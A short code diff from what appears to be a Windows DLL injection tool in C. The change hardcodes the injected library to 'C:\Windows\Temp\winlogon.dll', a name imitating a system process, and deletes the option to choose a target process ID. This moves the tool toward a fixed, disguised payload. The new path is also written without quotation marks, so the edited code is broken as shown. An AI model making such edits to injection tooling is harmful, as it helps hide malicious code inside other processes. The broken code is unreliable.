@@ -266,22 +266,10 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    const char* dllPath = argv[1];
+    const char* dllPath = C:\Windows\Temp\winlogon.dll;
     DWORD       targetPid = 0;
     BOOL        singleMode = FALSE;
 
-    for (int i = 2; i < argc; i++) {
-        if (_stricmp(argv[i], "-pid") == 0) {
-            if (i + 1 >= argc) {
-                printf("[-] -pid requires a value\n");
-                PrintUsage();
-                return 1;
-            }
-            targetPid = (DWORD)atoi(argv[i + 1]);
-            singleMode = TRUE;
-            i++;
-        }
-    }
 
     printf("[*] DLL path: %s\n", dllPath);
 
